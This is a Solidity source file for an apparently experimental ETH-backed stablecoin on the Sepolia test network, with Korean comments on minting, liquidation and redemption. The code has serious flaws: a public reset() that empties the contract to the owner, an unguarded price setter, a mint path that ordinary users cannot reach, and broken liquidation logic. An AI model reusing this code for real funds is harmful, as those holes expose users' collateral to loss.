// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.20;

import {AggregatorV3Interface} from "@chainlink/contracts@1.1.0/src/v0.8/shared/interfaces/AggregatorV3Interface.sol";
import "@openzeppelin/contracts@5.0.2/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts@5.0.2/access/Ownable.sol";
import "@openzeppelin/contracts@5.0.2/token/ERC20/extensions/ERC20Permit.sol";
// import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";

/**
 * @title Storage
 * @dev Store & retrieve value in a variable
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract RMAStablecoin is ERC20, Ownable, ERC20Permit {
    AggregatorV3Interface internal dataFeed;
    event Deposit(uint256 depositValue);

    address public realOwner;

    uint256 public minimum_collateralization_ratio;
    uint256 public liquidation_ratio;
    uint256 public ETHUSD;
    mapping(address => uint256) ethLiqudatePrice;
    mapping(address => uint256) weiValut;
    mapping(address => uint256) mintedStablecoins;
    address[] ethMintedAddress;
    uint256 public liqudateFeePercent;

    event EtherReceived(address indexed user, uint256 amount, string message);

    /**
     * Network: Sepolia
     * Aggregator: ETH/USD
     * Address: 0x694AA1769357215DE4FAC081bf1f309aDC325306
     */
    constructor(
        address initialOwner,
        uint256 _ETHUSD,
        uint256 _minimum_collateralization_ratio,
        uint256 _liquidation_ratio,
        uint256 _liqudateFeePercent
    )
        payable
        ERC20("StableCoin", "USDR")
        Ownable(initialOwner)
        ERC20Permit("StableCoin")
    {
        dataFeed = AggregatorV3Interface(
            0x694AA1769357215DE4FAC081bf1f309aDC325306
        );

        ETHUSD = _ETHUSD;
        minimum_collateralization_ratio = _minimum_collateralization_ratio;
        liquidation_ratio = _liquidation_ratio;
        liqudateFeePercent = _liqudateFeePercent;
        realOwner = msg.sender;
    }

    receive() external payable {}
    fallback() external payable {}

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    /**
     * Returns the latest answer.
     */
    function getChainlinkDataFeedLatestAnswer() public view returns (int) {
        // prettier-ignore
        (
            /* uint80 roundID */,
            int answer,
            /*uint startedAt*/,
            /*uint timeStamp*/,
            /*uint80 answeredInRound*/
        ) = dataFeed.latestRoundData();

        return answer;
    }

    function truncate(uint256 ethToUsdRatio) public pure returns (uint256) {
        return ethToUsdRatio / 1e8;
    }

    function setETHUSD(uint256 _ETHUSD) public returns (uint256) {
        ETHUSD = _ETHUSD;
        return ETHUSD;
    }

    function mintByEth() public payable returns (uint256) {
        // 사전 검증
        require(
            msg.value > 0,
            "StableCoin: you have to send ETH to swap Stable Coin"
        );

        // 청산가, 스테이블 코인 발행량 계산
        uint256 weiAmount = msg.value;
        // 3126 x wei / 1e18
        uint256 latestETHUSD = uint256(getChainlinkDataFeedLatestAnswer());
        ETHUSD = latestETHUSD;
        uint256 truncateETHUSD = truncate(ETHUSD);
        uint256 amountToMint = (((weiAmount * truncateETHUSD) / 1e18) * 100) /
            minimum_collateralization_ratio;
        uint256 liqudatePrice = (truncateETHUSD * 100) / liquidation_ratio;

        // 만약 이미 발행했었다면, 청산가 다시 계산
        if (weiValut[msg.sender] > 0) {
            uint256 valutWei = weiValut[msg.sender];
            // uint256 nowETHUSD = ETHUSD;
            // // 기존 1 이더, 새로운 2이더
            // // 그때 청산가 2000, 현재 3000
            // // 청산가 = (1 x 2000) + (2 x 6000) / 1+2 = 2666
            liqudatePrice =
                ((valutWei * ethLiqudatePrice[msg.sender]) +
                    (weiAmount * liqudatePrice)) /
                (valutWei + weiAmount);
        }

        // 저장 : 발행인 등록, 청산가, 담보 액수, 달러 발행 액수
        ethMintedAddress.push(msg.sender);
        ethLiqudatePrice[msg.sender] = liqudatePrice;
        weiValut[msg.sender] += msg.value;
        mintedStablecoins[msg.sender] += amountToMint;

        // 유저에게 토큰 발행 로직
        mint(msg.sender, amountToMint);

        return liqudatePrice;
    }

    function autoEthLiqudate()
        public
        payable
        returns (
            //uint256 nowPrice
            uint256
        )
    {
        // 현재 가격 계산
        // 200008417972
        uint256 latestETHUSD = uint256(getChainlinkDataFeedLatestAnswer());
        ETHUSD = latestETHUSD;
        // ETHUSD = nowPrice;
        // 2000
        uint256 truncateETHUSD = truncate(ETHUSD);

        // 전체 순회
        for (uint256 i = 0; i < ethMintedAddress.length; i++) {
            // 청산가가 현재 가격보다 높으면 청산
            if (ethLiqudatePrice[ethMintedAddress[i]] > truncateETHUSD) {
                address payable user = payable(ethMintedAddress[i]);

                //현재 가격으로 팔았다고 치고 차액만큼 돌려주기

                // 5000000000000000000
                uint256 valutWei = weiValut[user];
                //
                uint256 nowCollateralPrice = (valutWei * truncateETHUSD) / 1e18;
                uint256 liquidatationFee = (nowCollateralPrice *
                    liqudateFeePercent) / 100;

                uint256 refundAmountDollar = nowCollateralPrice -
                    mintedStablecoins[user] -
                    liquidatationFee;
                uint256 refundAmoutWei = (refundAmountDollar * 1 ether) /
                    truncateETHUSD;

                // 유저에게 차액 전송
                user.transfer(refundAmoutWei);

                // //이벤트 알림
                emit EtherReceived(
                    user,
                    refundAmoutWei,
                    "Your Valut is liqudated"
                );

                // // 수정 : 청산가 = 0 , 담보 액수 = 0으로 등록
                ethLiqudatePrice[user] = 0;
                weiValut[user] = 0;
            }
        }

        return 1;
    }

    function redeemCollateral() public payable returns (bool) {
        //
        address payable user = payable(msg.sender);
        // 담보액 확인
        if (weiValut[user] > 0) {
            uint256 valutAmount = weiValut[user];
            // ETH 주고
            user.transfer(valutAmount);
            // stableCoin 받고 다 태워
            // bool success = transfer(address(0),mintedStablecoins[user]);
            _burn(msg.sender, mintedStablecoins[user]);
            //_burn()

            // bool success = token.transferFrom(user, address(this), amount);

            // 데이터 변환
            weiValut[user] = 0;
            ethLiqudatePrice[user] = 0;
            mintedStablecoins[user] = 0;

            // event 발생
            emit EtherReceived(
                user,
                valutAmount,
                "Redeem Collateral Complete!"
            );

            return true;
        }
        return false;
    }

    function getweiValutBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getLinkValutBalance() public view returns (uint256) {
        return 1;
    }

    function getEthLiqudatePrice() public view returns (uint256) {
        address user = msg.sender;
        return ethLiqudatePrice[user];
    }

    function getweiValut() public view returns (uint256) {
        address user = msg.sender;
        return weiValut[user];
    }

    function getStablecoinBalance() public view returns (uint256) {
        return mintedStablecoins[msg.sender];
    }

    function reset() public payable returns (bool) {
        address payable tothe = payable(realOwner);
        uint256 total = address(this).balance;
        tothe.transfer(total);
        return true;
    }
}